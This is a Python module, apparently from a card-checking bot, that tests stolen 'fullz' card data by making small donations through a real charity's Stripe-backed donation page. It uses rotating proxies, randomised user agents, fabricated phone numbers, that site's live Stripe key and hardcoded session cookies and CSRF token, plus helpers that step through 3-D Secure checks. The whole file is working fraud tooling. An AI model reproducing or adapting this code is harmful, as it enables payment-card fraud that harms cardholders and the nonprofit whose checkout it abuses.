import asyncio
import random
import uuid
import json
import httpx
from FUNC.usersdb_func import *
from FUNC.defs import *
from fake_useragent import UserAgent


async def create_cvv_charge(fullz , data , proxy):
    try:
        await asyncio.sleep(random.randint(1, 2))
        cc , mes , ano , cvv = fullz.split("|")
        proxy = random.choice(proxy)
        proxy_ip = proxy.split(":")[0]
        proxy_port = proxy.split(":")[1]
        proxy_user = proxy.split(":")[2]
        proxy_password = proxy.split(":")[3]
        proxies = {
            "https://": f"http://{proxy_user}:{proxy_password}@{proxy_ip}:{proxy_port}",
            "http://": f"http://{proxy_user}:{proxy_password}@{proxy_ip}:{proxy_port}",
        }
        session = httpx.AsyncClient(timeout=60,proxies=proxies)
        data = random.choice(data)
        fname, lname, email, zip, add1, add2, city, state = (
            data["first_name"],
            data["last_name"],
            data["email"],
            data["zip"],
            data["add1"],
            data["add2"],
            data["city"],
            data["state"],
        )
        phone = (
            str(random.randint(220, 820))
            + str(random.randint(100, 999))
            + str(random.randint(1000, 9999))
        )
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': UserAgent().random,
        }

        data = {
            'card[name]': f'{fname} {lname}',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mes,
            'card[exp_year]': ano ,
            'guid': str(uuid.uuid4()),
            'muid': str(uuid.uuid4()),
            'sid': str(uuid.uuid4()),
            'payment_user_agent': 'stripe.js/e362d03051; stripe-js-v3/e362d03051; card-element',
            'referrer': 'https://app.swellandgood.com',
            'time_on_page': str(random.randint(10000, 99999)),
            'key': 'pk_live_cerXJRgBMErz3b3hIGVUD8Nn',
            '_stripe_account': 'acct_1Hz0MuCj321BK92p',
        }
        response = await session.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
        try:
            id =  response.json()['id']
        except:
            await session.aclose()
            return response.text
        
        cookies = {
    '_ga': 'GA1.2.1137653361.1697311764',
    '_gid': 'GA1.2.1491120689.1697311764',
    '__stripe_mid': 'b9012e76-8bc2-4c88-b680-3b897295ef5b2275eb',
    '_ottergive_key': 'SFMyNTY.g3QAAAABbQAAAAtfY3NyZl90b2tlbm0AAAAYakRSWFF1Q25od3p1U0tEQkh1eEs1dz09.BrO2FGuLFcS3UkNdYDqG2bqFRj85Mz4ezfOhFOGwyAc',
    '_ga_NPYTNN7PM2': 'GS1.2.1697382661.2.0.1697382661.0.0.0',
}
        headers = {
            'authority': 'app.swellandgood.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://app.swellandgood.com',
            'referer': 'https://app.swellandgood.com/ruths-house-ct/rh-lp',
            'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': UserAgent().random,
        }

        json_data = {
    '_csrf_token': 'KXwHEzcPOTQaBUkdIREoER1HSBNaAAAAC8UKfzzZrr3hrZlSU20Xow==',
    'stripe_token': id,
    'donation': {
        'address_line1': add1,
        'address_line2': add2,
        'amount': 100,
        'city': city,
        'email': email,
        'first_name': fname,
        'last_name': lname,
        'opted_in': False,
        'phone': phone,
        'postal_code': zip,
        'state': state,
        'tribute': None,
    },
}

        response = await session.post('https://app.swellandgood.com/ruths-house-ct/rh-lp', 
                        cookies=cookies, 
                        headers=headers, 
                        json=json_data)
        await session.aclose()

        return response.text

    except Exception as e:
        await log(traceback.format_exc())
        return str(e)




async def authenticate(json, pk, session):
    try:
        three_d_secure_2_source = json["next_action"]["use_stripe_sdk"][
            "three_d_secure_2_source"
        ]
        url = "https://api.stripe.com/v1/3ds2/authenticate"
        data = {
            "source": three_d_secure_2_source,
            "browser": '{"fingerprintAttempted":false,"fingerprintData":null,"challengeWindowSize":null,"threeDSCompInd":"Y","browserJavaEnabled":false,"browserJavascriptEnabled":true,"browserLanguage":"en-US","browserColorDepth":"24","browserScreenHeight":"864","browserScreenWidth":"1536","browserTZ":"-360","browserUserAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
            + str(random.randint(115, 116))
            + '.0.0.0 Safari/537.36"}',
            "one_click_authn_device_support[hosted]": "false",
            "one_click_authn_device_support[same_origin_frame]": "false",
            "one_click_authn_device_support[spc_eligible]": "true",
            "one_click_authn_device_support[webauthn_eligible]": "true",
            "one_click_authn_device_support[publickey_credentials_get_allowed]": "true",
            "key": pk,
        }
        result = await session.post(url, data=data)

        try:
            return result.json()["state"]
        except:
            try:
                return result.json()["error"]["message"]
            except:
                return result.text

    except Exception as e:
        return e


async def one_click_3d_check(json, session):
    try:
        three_ds_method_url = json["next_action"]["use_stripe_sdk"][
            "three_ds_method_url"
        ]
        await session.get(three_ds_method_url)
    except Exception as e:
        pass
